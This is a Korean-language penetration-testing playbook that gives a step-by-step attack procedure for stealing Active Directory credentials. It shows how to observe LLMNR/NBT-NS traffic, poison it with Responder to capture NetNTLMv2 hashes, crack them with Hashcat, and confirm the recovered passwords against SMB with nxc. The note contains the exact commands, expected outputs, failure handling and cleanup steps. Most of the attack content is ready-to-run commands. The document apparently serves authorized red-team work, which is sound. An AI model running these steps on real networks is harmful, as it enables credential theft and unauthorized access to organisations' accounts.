---
tags:
  - 환경/ad
  - 서비스/llmnr
  - 기능/자격증명수집
시작상태:
  - AD 계정 없이 내부 네트워크의 같은 링크에 연결
  - LLMNR 또는 NBT-NS 요청 관찰
목표:
  - NetNTLMv2 challenge-response 수집
  - 평문 비밀번호 후보 복구
  - 대상 서비스에서 계정 유효성과 권한 확인
필요권한:
  - Linux 공격 호스트의 패킷 캡처와 listener 바인딩 권한
필요정보:
  - 요청을 관찰한 네트워크 인터페이스
  - 대상 서비스 주소 또는 CIDR
  - 비밀번호 후보 wordlist
네트워크위치:
  - 피해 호스트와 LLMNR 또는 NBT-NS broadcast를 공유하는 링크
---

# 무인증 내부망에서 Responder로 AD 자격 증명 확보

## 시나리오 개요

AD 계정 없이 내부 네트워크의 같은 링크에 연결된 Linux 공격 호스트에서 LLMNR·NBT-NS 요청을 먼저 수동 관찰하고, Responder로 NetNTLMv2 challenge-response를 수집한 뒤 오프라인 크래킹과 대상 서비스 인증 검증을 거쳐 사용할 수 있는 AD 자격 증명을 확인한다.

저장된 NetNTLM challenge-response는 NT hash가 아니므로 Pass the Hash에 사용하지 않는다. 실시간 NTLM Relay가 목적이면 캡처 파일을 재사용하지 말고 [[NTLM Relay 조건 검토]]에서 대상 보호 설정과 listener 구성을 별도로 준비한다.

## 기준 구조

```text
Linux 공격 호스트
  -> 같은 링크의 Windows 피해 호스트가 보내는 LLMNR·NBT-NS 요청 관찰
  -> Responder 포이즈닝과 NetNTLMv2 수집
  -> Linux 분석 호스트에서 Hashcat 크래킹
  -> 도달 가능한 SMB·LDAP·WinRM 등에서 계정 유효성과 권한 확인
```

## 시작 상태

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 명령 실행 위치 | 피해 호스트의 LLMNR·NBT-NS 요청을 볼 수 있는 Linux 공격 호스트 | `ip -br address`, Responder `-A` 출력 | SOCKS proxy나 routed subnet만 있는 경우가 아니라 같은 링크인지 확인 |
| 현재 계정과 권한 | 공격 호스트에서 packet capture와 listener port bind 가능 | `sudo -v`, `sudo ss -luntp` | 필요한 권한과 기존 listener 점유를 먼저 정리 |
| 대상까지의 네트워크 경로 | 복구한 비밀번호를 확인할 SMB·LDAP·WinRM 등 인증 서비스에 도달 가능 | 대상별 TCP 연결 또는 기존 서비스 스캔 결과 확인 | route, VLAN과 서비스 포트를 다시 확인 |
| 보유 정보 | 실행 인터페이스, 요청 출발지, wordlist와 캡처 로그 저장 위치 | 분석 모드 출력과 Responder 실행 위치 확인 | 인터페이스와 로그 경로를 먼저 확정 |

`<INTERFACE>`는 공격 호스트에서 대상 broadcast 대역을 직접 보는 인터페이스 이름(예: `eth0`)이다. `<RESPONDER_LOG>`는 실행 뒤 생성되거나 갱신된 `*NTLMv2*.txt` 절대 경로이고, `<FIRST_NEW_BYTE>`는 실행 전 기록한 그 로그의 byte 크기보다 1 큰 정수 또는 새 파일의 `1`이다. `<RESPONDER_HASH_INPUT>`·`<RESPONDER_POTFILE>`은 Linux 분석 호스트에서 작업 전 없었던 새 파일 경로, `<WORDLIST>`는 해당 호스트의 후보 목록 경로다. `<SMB_TARGETS>`·`<DOMAIN>`·`<USER>`·`<PASSWORD>`는 capture 출력 또는 복구 결과에 연결된 실제 서비스 입력이며, `nxc`는 Linux 분석 호스트에서 실행한다.

## 공격 경로 요약

| 단계 | 실행 위치 | 수행할 행동 | 확인할 출력·상태 | 다음 단계 |
|---|---|---|---|---|
| 1 | Linux 공격 호스트 | 인터페이스와 listener 기준 상태 기록 | 같은 링크의 인터페이스·주소, 기존 포트 점유 | 분석 모드 실행 |
| 2 | Linux 공격 호스트 | [[내부망 수동 호스트 식별]]과 Responder Analyze 모드 | LLMNR·NBT-NS 요청 이름과 출발지 | 요청이 있을 때만 활성 포이즈닝 |
| 3 | Linux 공격 호스트 | [[LLMNR NBT-NS 포이즈닝으로 NTLM 인증 수집]] | `response sent`, `NTLMv2` capture와 로그 파일 | 캡처 형식 확인 |
| 4 | Linux 분석 호스트 | [[오프라인 해시 크래킹]] | Hashcat `Cracked`와 `hash:password` | 자격 증명 검증 |
| 5 | 대상 인증 서비스에 도달하는 Linux 호스트 | [[원격 비밀번호 공격]] | 서비스 인증 성공, 계정 범위와 권한 단서 | [[확보한 자격 증명으로 원격 접근 경로 선택]] |

## 1. 인터페이스와 기존 listener 확인

Linux 공격 호스트에서 피해 호스트와 같은 링크에 연결된 인터페이스를 확인하고, Responder 실행 전 listening port 상태를 기록한다.

```bash
ip -br address
ip route
sudo ss -luntp
```

확인할 출력:

- 성공을 입증하는 출력: `<INTERFACE>`에 대상 대역 주소가 있고 피해 호스트의 broadcast를 직접 관찰할 수 있음.
- 새로 얻는 정보·접근·권한: Responder를 실행할 인터페이스와 실행 전 listener 기준 상태.
- 실패하면 먼저 확인할 조건: routed access나 SOCKS proxy만 확보한 상태인지, VLAN 경계 때문에 link-local multicast와 broadcast가 전달되지 않는지 확인한다.

## 2. 이름 해석 요청 수동 관찰

Linux 공격 호스트에서 `-A` Analyze 모드로 응답을 보내지 않고 LLMNR·NBT-NS 요청을 관찰한다.

`<INTERFACE>`는 1단계에서 대상 broadcast 주소를 확인한 같은 Linux 인터페이스 이름(예: `eth0`)을 재사용한다.

```bash
sudo responder -I <INTERFACE> -A
```

확인할 출력:

- 성공을 입증하는 출력: LLMNR 또는 NBT-NS query name과 요청 출발지가 반복해서 표시됨.
- 새로 얻는 정보·접근·권한: 포이즈닝 여부를 결정할 프로토콜, 요청 이름, 출발지와 발생 시간대.
- 실패하면 먼저 확인할 조건: 인터페이스 선택, 같은 broadcast domain 여부, 실제 이름 해석 실패 트래픽과 관찰 시간을 확인한다.

요청이 보이지 않으면 활성 모드로 바꾸지 않는다. `-A`에서는 challenge-response를 수집하지 않으며 이 상태를 인증 유도 성공으로 기록하지 않는다.

## 3. Responder로 NetNTLMv2 수집

요청이 확인된 동일한 Linux 공격 호스트에서 활성 포이즈닝을 시작한다. 실행 중 `response sent`와 `NTLMv1` 또는 `NTLMv2` capture를 서로 다른 상태로 확인한다.

`<INTERFACE>`는 Analyze 모드에서 요청을 보인 동일 인터페이스다. 다른 인터페이스 이름으로 바꾸지 않으며, 실행 위치는 Linux 공격 호스트다.

Kali 패키지 기본 경로를 사용한다면 실행 전에 기존 NTLMv2 로그의 경로·byte 크기·수정 시각을 기록한다. 설치 방식이 다르면 Responder 실행 디렉터리의 `logs`로 바꾼다.

```bash
find /usr/share/responder/logs -maxdepth 1 -type f -name '*NTLMv2*.txt' -printf '%p %s %T@\n'
```

```bash
sudo responder -I <INTERFACE> -v
```

확인할 출력:

- 성공을 입증하는 출력: 이름 해석 요청에 대한 응답 전송 뒤 사용자·도메인·출발지가 포함된 `NTLMv2` capture 표시.
- 새로 얻는 정보·접근·권한: 계정 식별자가 연결된 NetNTLMv2 challenge-response와 Responder 로그 파일.
- 실패하면 먼저 확인할 조건: Analyze 모드가 남아 있는지, SMB·HTTP listener 포트 충돌, 요청 유형과 인증 발생 여부를 확인한다.

Kali 패키지 설치의 기본 로그 위치에서는 현재 생성된 파일을 다음처럼 확인한다. 설치 방식이 다르면 Responder 실행 디렉터리의 `logs`를 사용한다.

```bash
ls -lt /usr/share/responder/logs
```

`<RESPONDER_LOG>`는 이번 실행에서 생성되거나 갱신된 `*NTLMv2*.txt` 파일로 지정한다. 이전 실행의 캡처와 현재 캡처를 섞지 않는다.

## 4. NetNTLMv2 오프라인 크래킹

Linux 분석 호스트에서 이번 실행의 전체 NetNTLMv2 라인만 `<RESPONDER_HASH_INPUT>`에 분리하고 Hashcat mode `5600`으로 처리한다. Responder 원본 로그는 여러 실행이 누적될 수 있으므로 직접 potfile처럼 사용하지 않는다.

`<RESPONDER_LOG>`는 3단계에서 새로 생기거나 갱신된 절대 로그 경로, `<FIRST_NEW_BYTE>`는 그 실행 전 byte 크기에서 계산한 정수다. `<RESPONDER_HASH_INPUT>`·`<RESPONDER_POTFILE>`은 Linux 분석 호스트의 새 상대 또는 절대 파일 경로(예: `./responder-p03.hash`, `./responder-p03.pot`)이고, `<WORDLIST>`는 같은 호스트의 기존 후보 목록 경로(예: `/usr/share/wordlists/rockyou.txt`)다.

```bash
test ! -e '<RESPONDER_HASH_INPUT>'
test ! -e '<RESPONDER_POTFILE>'
tail -c +<FIRST_NEW_BYTE> '<RESPONDER_LOG>' > '<RESPONDER_HASH_INPUT>'
hashcat -m 5600 '<RESPONDER_HASH_INPUT>' '<WORDLIST>' --potfile-path '<RESPONDER_POTFILE>' --restore-disable --backend-ignore-opencl -d 1 -O -w 3
hashcat --show -m 5600 '<RESPONDER_HASH_INPUT>' --potfile-path '<RESPONDER_POTFILE>' --backend-ignore-opencl -d 1 -O -w 3
```

기존 로그가 갱신됐다면 `<FIRST_NEW_BYTE>`는 실행 전 byte 크기보다 1 큰 값이고, 이번 실행에서 새 파일이 생겼다면 `1`이다. 분리 파일의 각 줄에서 계정·도메인·challenge-response 형식이 이번 실행 화면과 일치하는지 확인한 뒤 크래킹한다.

확인할 출력:

- 성공을 입증하는 출력: `Status...........: Cracked`, `Recovered` 증가와 `hash:password` 결과.
- 새로 얻는 정보·접근·권한: 캡처된 계정과 연결된 평문 비밀번호 후보.
- 실패하면 먼저 확인할 조건: `Token length exception`이면 로그의 전체 challenge-response 형식과 mode를 확인하고, `Exhausted`이면 현재 wordlist로 복구되지 않은 상태로 기록한다.

평문 복구 전 NetNTLMv2는 Pass the Hash 입력이 아니다. 크래킹하지 않고 실시간 Relay를 시도할 조건이 있다면 현재 Responder를 중지하고 [[NTLM Relay 조건 검토]]에서 SMB signing, EPA·CBT와 충돌하는 SMB·HTTP listener를 먼저 확인한다.

## 5. 복구한 비밀번호의 계정 범위와 서비스 권한 확인

대상 인증 서비스에 도달하는 Linux 호스트에서 먼저 SMB처럼 식별된 서비스 하나에 비밀번호를 적용한다. 캡처에 표시된 도메인과 사용자 이름을 그대로 분리해 입력한다.

`<SMB_TARGETS>`는 445/TCP가 확인된 대상 IP 또는 FQDN 목록(예: `198.51.100.20`)이고, `<DOMAIN>`·`<USER>`는 capture 줄의 도메인·계정명이다. `<PASSWORD>`는 4단계에서 그 계정에 연결되어 복구된 평문 후보이며, 이 명령은 Linux 분석 호스트에서 실행한다.

```bash
nxc smb <SMB_TARGETS> -d <DOMAIN> -u <USER> -p '<PASSWORD>' --continue-on-success
```

확인할 출력:

- 성공을 입증하는 출력: 대상별 `[+]` 인증 성공과 실제 도메인·호스트명 표시.
- 새로 얻는 정보·접근·권한: 현재 유효한 AD 계정, 인증되는 호스트 범위와 관리자 여부 후보.
- 실패하면 먼저 확인할 조건: 캡처된 계정이 머신 계정인지 사용자 계정인지, `<DOMAIN>` 형식, 대상 445/TCP 도달성, 계정 잠금·비밀번호 변경 여부를 확인한다.

`[+]`는 SMB 인증 성공이며 원격 셸이나 관리자 권한을 의미하지 않는다. 관리자 표시, 공유 권한과 원격 명령 실행 가능 여부는 [[확보한 자격 증명으로 원격 접근 경로 선택]]에서 다시 확인한다.

## 실패 시 분기

| 멈춘 단계·출력 | 가능한 원인 | 확인 명령 | 이어갈 단계 |
|---|---|---|---|
| Analyze 모드에 요청이 없음 | 잘못된 인터페이스, 다른 VLAN 또는 이름 해석 실패 트래픽 부재 | `ip -br address`, `ip route`, packet capture | 같은 링크와 관찰 시간대를 확인한 뒤 2단계 반복 |
| 요청은 보이지만 `NTLMv2` capture가 없음 | 피해 호스트가 인증하지 않음, listener 충돌 또는 Analyze 모드 유지 | `sudo ss -luntp`, Responder 시작 요약 | 충돌을 해소하고 3단계 반복 |
| Hashcat `Token length exception` | 로그 일부만 복사했거나 mode가 다름 | 원본 로그의 전체 라인과 capture 형식 확인 | 4단계 입력 정정 |
| Hashcat `Exhausted` | 현재 후보 공간에 비밀번호 없음 | wordlist·rule·mask 우선순위 재평가 | [[오프라인 해시 크래킹]]에서 후보 전략 변경 또는 [[NTLM Relay 조건 검토]] |
| SMB 인증 실패 | 계정·도메인 형식 오류, 비밀번호 변경, 서비스 미도달 또는 머신 계정 capture | 대상 445/TCP와 캡처 계정 형식 확인 | 입력을 정정해 5단계 반복하거나 다른 인증 서비스 선택 |

## 변경 영향과 복구

| 변경 대상 | 기록할 기존 값 | 예상 영향 | 복구 명령 |
|---|---|---|---|
| 공격 호스트의 SMB·HTTP·WPAD 등 listener | 실행 전 `sudo ss -luntp` 출력 | 기존 서비스와 포트 충돌 또는 의도하지 않은 인증 수신 | Responder에서 `Ctrl+C` 후 아래 확인 명령 실행 |
| 링크 로컬 이름 해석 응답 | 실행 시간, 인터페이스와 요청 출발지 | 잘못된 이름 요청이 공격 호스트로 향해 연결 지연·실패 또는 인증 프롬프트 발생 | Responder에서 `Ctrl+C`로 포이즈닝 즉시 중지 |
| 이번 실행의 hash 입력과 Hashcat potfile | 작업 전 존재하지 않은 `<RESPONDER_HASH_INPUT>`·`<RESPONDER_POTFILE>` exact 경로 | NetNTLMv2 입력과 복구 결과가 분석 호스트에 남음 | `rm -- '<RESPONDER_HASH_INPUT>' '<RESPONDER_POTFILE>'` 후 `test ! -e`로 두 경로 부재 확인 |
| 서비스 인증 client와 계정 잠금 영향 | client PID·대상·계정·시도 시간, AD라면 시도 전 계정 상태 | 추가 인증 시도가 계정 잠금 상태를 바꿀 수 있음 | 인증 client를 먼저 종료하고 [[원격 비밀번호 공격]]의 계정 잠금 확인 절차를 따른다 |

```bash
pgrep -af responder
sudo ss -luntp
```

정리 순서는 추가 인증 시도 중단 → 서비스 client 종료와 계정 상태 확인 → Responder `Ctrl+C` → listener 기준선 대조 → 작업용 hash·potfile 처분이다. Responder 프로세스가 남지 않고 listener 상태가 실행 전 기준과 같아야 한다. 이 시나리오는 `Responder.conf` 변경을 요구하지 않으며, 별도 변경했다면 기록한 원래 값으로 복원한다. Responder 기본 로그는 기존 자료가 누적된 파일일 수 있으므로 이번 실행에서 새로 만든 파일임이 확인되지 않으면 통째로 삭제하지 않는다.

## 완료 기준

### 공격 목표

- Responder가 이번 실행에서 수집한 계정 식별자와 전체 NetNTLMv2 challenge-response를 확인했다.
- Hashcat이 평문 비밀번호 후보를 복구했거나, 복구 실패를 `Exhausted` 등 명확한 상태로 기록했다.
- 복구한 평문이 대상 서비스에서 현재 유효한지 확인하고 인증 성공과 실제 관리자·세션 권한을 구분했다.
- 평문 비밀번호를 확보했으면 [[확보한 자격 증명으로 원격 접근 경로 선택]], 실시간 Relay를 선택하면 [[NTLM Relay 조건 검토]]로 이동한다.

### 복구 상태

- 인증 client와 Responder가 종료되고 listener가 실행 전 기준으로 돌아왔는지 확인한다.
- 작업용 hash·potfile의 exact 경로가 제거됐고, 원본 Responder 로그의 보존·폐기 상태를 별도로 기록한다.
- 계정 잠금이 발생했다면 실제 계정 상태가 복구됐는지 확인해야 한다. 인증 실패·포이즈닝·서비스 감사 기록은 남으므로 이를 포함해 “완전 원상복구”라고 표현하지 않는다.

## 관련 노트

- [[무인증 내부 네트워크에서 AD 단서 확인]]
- [[내부망 수동 호스트 식별]]
- [[LLMNR NBT-NS 포이즈닝으로 NTLM 인증 수집]]
- [[오프라인 해시 크래킹]]
- [[원격 비밀번호 공격]]
- [[Responder]]
- [[hashcat]]
- [[netexec]]
